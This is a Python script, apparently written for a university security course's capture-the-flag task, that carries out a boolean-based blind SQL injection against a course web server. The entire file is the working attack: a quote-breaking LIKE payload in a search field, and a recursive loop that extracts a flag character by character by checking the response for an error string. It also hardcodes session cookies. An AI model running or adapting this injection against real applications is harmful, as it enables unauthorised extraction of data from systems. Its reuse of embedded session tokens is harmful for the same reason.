#!/usr/bin/env python

import requests, json

url = 'https://cseproj91.cse.iitk.ac.in:9876/index.php'
headers ={
        'Host':'cseproj91.cse.iitk.ac.in:9876', 
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0', 
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
        # Accept-Language: en-US,en;q=0.5
        # Accept-Encoding: gzip, deflate, br
        'Referer':'https://cseproj91.cse.iitk.ac.in:9876/index.php', 
        'Cookie':'_ga=GA1.3.586342836.1515517137; session=.eJwVjcEKgzAQRH-l5AtMai-F3qJiYbdEIrJ7rC2VjWmPrRH_vfE0b-ANs6r35z0-1XlVh7s6K0hz4IjCtlpoYGEZNRqOkFqNttLoXwbSNENDX5b-hI0zN9-WJKFAH0qMbgHjfth0AWIt2Q2UHhNFlputJXtHtF1uzlDqE3j3xUgFC2nw17gnpr5gO2r2fclDVYBp84YW8Jml3T8My-uitu0Pt6U-8A.DbMrWw.VPfpW0AFh8_uyIM7l-4rhq6Es04; PHPSESSID=0bqtuak1rmh3r56ugrrcg9ohi6', 
        # Connection: keep-alive
        # Upgrade-Insecure-Requests: 1
        'Cache-Control': 'max-age=0'
        }

charset = 'abcdefghijklmnopqrstuvwxyz0123456789{}'

def dfs(prefix):
    for char in charset:
        password_prefix = prefix+char
        title = "olatomako' or title like '"+password_prefix+"%' or '1' = '2"
        data = {'title':title, 'action':'search'}
        r = requests.post(url, data = data, headers = headers)
        if r.text[2052:2057] != 'OOPS!':
            print password_prefix
            dfs(password_prefix)

dfs('cs628a{56fdf1804d87b0a')
